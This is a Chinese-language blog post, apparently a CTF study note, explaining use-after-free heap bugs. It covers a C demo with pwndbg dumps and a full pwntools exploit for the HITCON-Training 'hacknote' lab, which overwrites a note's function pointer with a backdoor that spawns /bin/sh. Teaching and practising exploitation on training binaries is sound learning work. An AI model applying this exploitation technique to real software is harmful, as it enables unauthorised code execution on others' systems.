---
title: Use-After-Free
date: 2020-02-24 21:19:04
tags: pwn
---
听师傅们说UAF是入门堆<!--more-->比较友好的一种漏洞，再一个CVE-2019-0708也是UAF漏洞，所以我对他也有了一些兴趣，现在来学习一下UAF漏洞及其利用方法  
## 漏洞介绍  
UAF顾名思义就是释放后再使用，简单来说就是F——A——U，即分配的内存释放后，没有将改片内存中的数据清空，对应的指针没有置为NULL，然后该片内存再次被使用的情况。在这里解释一下，free之后的内存并不会自动清空里面的数据，必须要把它对应的指针置为NULL才会清空。  
我们可以看一个小例子  
```C
#include <stdlib.h>
#include <string.h>

int main(){

        char *p;

        p = malloc(150);

        memcpy(p,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",150);
        free(p);
        return 0;
}
```
在free函数下个断点
free前  
```Shell
pwndbg> x/24gx 0x602000
0x602000:       0x0000000000000000      0x00000000000000a1
0x602010:       0x6161616161616161      0x6161616161616161
0x602020:       0x6161616161616161      0x6161616161616161
0x602030:       0x6161616161616161      0x6161616161616161
0x602040:       0x6161616161616161      0x6161616161616161
0x602050:       0x6161616161616161      0x6161616161616161
0x602060:       0x6161616161616161      0x6161616161616161
0x602070:       0x6161616161616161      0x6161616161616161
0x602080:       0x6161616161616161      0x6161616161616161
0x602090:       0x6161616161616161      0x6161616161616161
0x6020a0:       0x0000616161616161      0x0000000000020f61
0x6020b0:       0x0000000000000000      0x0000000000000000
```  
free后  
```Shell
pwndbg> x/24gx 0x602000
0x602000:       0x0000000000000000      0x0000000000021001
0x602010:       0x6161616161616161      0x6161616161616161
0x602020:       0x6161616161616161      0x6161616161616161
0x602030:       0x6161616161616161      0x6161616161616161
0x602040:       0x6161616161616161      0x6161616161616161
0x602050:       0x6161616161616161      0x6161616161616161
0x602060:       0x6161616161616161      0x6161616161616161
0x602070:       0x6161616161616161      0x6161616161616161
0x602080:       0x6161616161616161      0x6161616161616161
0x602090:       0x6161616161616161      0x6161616161616161
0x6020a0:       0x0000616161616161      0x0000000000020f61
0x6020b0:       0x0000000000000000      0x0000000000000000
```  
可以看到源代码中并没有将指针p置为NULL，所以free前后内存中还是存在free前的数据  
一般来说我们的UAF情况是，内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。  
## HackNote  
接下来我们用HITCON-Trainning的lab10来作为例题  
检查保护  
```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```  
虽然开了Canary，但是这是一个堆利用的程序，和栈并没有关系，可无视  
查看main函数  
```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v5; // [esp+Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &buf, 4u);
      v3 = atoi(&buf);
      if ( v3 != 2 )
        break;
      del_note();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        print_note();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add_note();
    }
  }
} 
```  
delete函数  
```C
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(*((void **)notelist[v1] + 1));
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```   
show函数  
```C
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    (*(void (__cdecl **)(void *))notelist[v1])(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```  
add函数  
```C
unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)notelist[i] + 1), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```  
程序里还有一个magic函数  
```C
int magic()
{
  return system("/bin/sh");
}
```  
从add函数中可以看到，申请一块内存的时候，会先malloc(8)，用以存放print_note_content字段(puts指针)和content指针，然后程序会根据用户输入的size来分配指定大小的内存。  
我们利用的思路是改写chunk中的print_note_content字段(puts指针)为magic函数，即可拿shell  
具体如下：  
申请chunk1(fastbin范围)  
申请chunk2(fastbin范围)  
释放chunk1  
释放chunk2  
此时fastbin中情况如下  
```shell
fastbins
0x10: 0x804b028 —▸ 0x804b000 ◂— 0x0
0x18: 0x804b038 —▸ 0x804b010 ◂— 0x0
......  
```  
即：  
chunk2(8字节)-->-->chunk1(8字节)  
chunk2(real_content)-->chunk1(real_content)   

再申请大小为8的chunk3，填入magic的函数地址   
申请时首先会申请一个8大小的空间，这时chunk2(8字节)的空间给了这个块，接着再申请size大小的块，这时chunk1(字节)的空间给了这个块  
向chunk3中写入magic的函数地址，也就相对应向chunk1(8字节)写入magic的函数地址，此时原本存放puts函数指针的地方被magic函数覆盖了，也就导致了接下来打印chunk1内容的时候会直接执行magic函数  
exp:  
```Python
#coding=utf-8
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
p=process("./hacknote")
#p=remote("node3.buuoj.cn",25290)
elf=ELF("./hacknote")
magic = 0x8048986

def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("size :")
    p.sendline(str(size))
    p.recvuntil("Content :")
    p.sendline(content)

def delete(index):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(index))

def view(index):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(index))

add(16,"aaa")
add(16,"bbb")

delete(0)
delete(1)

add(8,p32(magic))
view(0)

p.interactive()
```  
这题总体来说还是不难的，程序中存在后门函数，我们只要直接写进去就行了  


</br>
</br>
参考链接:

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/   
http://mrbelieve.tech/2020/02/01/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/  
https://www.b1ndsec.cn/?p=352  
https://www.jianshu.com/p/2cae38284bff  


